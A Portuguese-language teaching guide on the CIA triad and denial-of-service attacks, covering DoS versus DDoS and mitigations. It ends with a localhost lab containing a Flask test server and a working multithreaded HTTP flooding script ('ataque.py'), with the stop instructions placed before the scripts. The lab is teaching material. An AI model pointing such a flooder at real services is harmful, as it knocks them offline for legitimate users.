# 🛡️ Fundamentos de Segurança da Informação: Foco em Disponibilidade

Este guia aborda os pilares da segurança, com foco especial na manutenção da disponibilidade contra ataques de negação de serviço.

---

## 🏛️ Os Pilares da Segurança (Tríade CIA)

A segurança da informação é sustentada por três pilares fundamentais, conhecidos como a **Tríade CIA**:

1.  **Confidencialidade (Confidentiality):** Garante que a informação seja acessível apenas por pessoas autorizadas. Protege contra o vazamento de dados.
2.  **Integridade (Integrity):** Garante que a informação não seja alterada de forma não autorizada ou acidental. Mantém a precisão dos dados.
3.  **Disponibilidade (Availability):** Garante que os sistemas e dados estejam prontos para uso quando os usuários autorizados precisarem.

---

## 🌐 O Pilar da Disponibilidade

A **Disponibilidade** é o alvo principal quando falamos de ataques de infraestrutura. Um sistema disponível deve ser:
* **Resiliente:** Capaz de aguentar picos de acesso.
* **Acessível:** Sem interrupções de serviço (uptime).
* **Recuperável:** Capaz de voltar ao ar rapidamente após uma falha.

---

## ⚔️ Ataques de Negação de Serviço

Os ataques de negação de serviço visam derrubar o pilar da **Disponibilidade**, impedindo que usuários legítimos acessem o serviço.

### 1. DoS (Denial of Service)
O **DoS** é um ataque de "um para um".
* **Como funciona:** Um único computador envia uma quantidade massiva de requisições ou pacotes malformados para um servidor.
* **Cenário:** É como uma única pessoa tentando entrar em uma porta giratória e travando-a de propósito; ninguém mais entra, mas é fácil para o segurança identificar e remover essa pessoa.

### 2. DDoS (Distributed Denial of Service)
O **DDoS** é um ataque de "muitos para um".
* **Como funciona:** O atacante utiliza uma **Botnet** (uma rede de milhares de dispositivos infectados, como PCs, câmeras e roteadores) para atacar o alvo simultaneamente.
* **Cenário:** É como se milhares de pessoas decidissem entrar na mesma loja ao mesmo tempo. O segurança não consegue distinguir quem é cliente real e quem está ali apenas para causar o tumulto.

---

## 📊 Comparativo Técnico

| Característica | DoS | DDoS |
| :--- | :--- | :--- |
| **Origem** | Único IP / Única conexão. | Milhares de IPs distribuídos globalmente. |
| **Volume de Dados** | Baixo a Médio. | Extremamente Alto (Gbps ou Tbps). |
| **Identificação** | Fácil (identifica-se a fonte única). | Difícil (tráfego parece vir de usuários reais). |
| **Mitigação** | Bloqueio de IP ou Firewall simples. | Requer CDNs e filtros de tráfego avançados. |

---

## 🛡️ Como garantir a Disponibilidade?

Para proteger sistemas contra esses ataques, aplicamos:
* **Load Balancing:** Distribuir o tráfego entre vários servidores.
* **Redundância:** Ter sistemas de backup prontos para assumir a carga.
* **Rate Limiting:** Limitar quantas requisições um único usuário pode fazer.
* **WAF (Web Application Firewall):** Filtrar padrões de tráfego malicioso.




### Como parar o ataque no Windows
Existem três formas de encerrar os scripts:

* **No Terminal:** Clique na janela do prompt onde o `ataque.py` está rodando e aperte **Ctrl + C**. (Às vezes precisa apertar várias vezes porque as threads ficam tentando abrir novas conexões).
* **Fechar a Janela:** Simplesmente feche o Prompt de Comando ou o PowerShell onde o script está rodando.
* **Pelo Gerenciador de Tarefas:** 1. Aperte `Ctrl + Shift + Esc`.
    2. Vá na aba **Processos**.
    3. Procure por **Python** (ou "Python Launcher").
    4. Clique com o botão direito e selecione **Finalizar Tarefa**.

#### Servidor (`servidor.py`)
Vamos simular que o servidor precisa fazer um esforço real. Adicione um pequeno `sleep` para simular processamento de banco de dados:

```python
from flask import Flask
import time

app = Flask(__name__)

@app.route('/')
def home():
    time.sleep(0.5) # Isso vai "segurar" a conexão por meio segundo
    return "<h1>Servidor Sob Carga</h1>"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, threaded=False) # 'threaded=False' faz ele processar um por um
```

#### Atacante (`ataque.py`)
A biblioteca `requests` é lenta para ataques porque ela espera a resposta completa. Vamos aumentar o número de threads para forçar o Windows a abrir muitas conexões simultâneas:

```python
import threading
import requests

target = "http://127.0.0.1:5000"

def attack():
    while True:
        try:
            # timeout=0.1 faz o script não ficar esperando a resposta do servidor
            requests.get(target, timeout=0.1)
        except:
            pass

# Aumente para 200 ou 500 threads (Cuidado: seu PC pode travar um pouco!)
for i in range(200):
    thread = threading.Thread(target=attack)
    thread.daemon = True # Faz as threads morrerem quando você fechar o script
    thread.start()

print("Ataque rodando... Tente acessar o site agora.")
while True: pass # Mantém o script principal vivo
```

### O que observar agora:
1.  Abra o terminal
2.  Inicie o `servidor.py`.
3.  Abra o navegador em `http://127.0.0.1:5000` (deve carregar em 0.5s).
4.  Abra um segundo terminal
5.  Inicie o `ataque.py`.
6.  Tente dar **F5** no navegador. Agora ele deve ficar girando o ícone de carregamento e dar erro de **"Tempo Limite Atingido"**.

**Dica de mestre:** Se ainda assim não cair, é porque seu computador é uma máquina de guerra! Tente aumentar o `range(200)` para `range(500)`. Só não esqueça de finalizar o processo pelo Gerenciador de Tarefas depois!
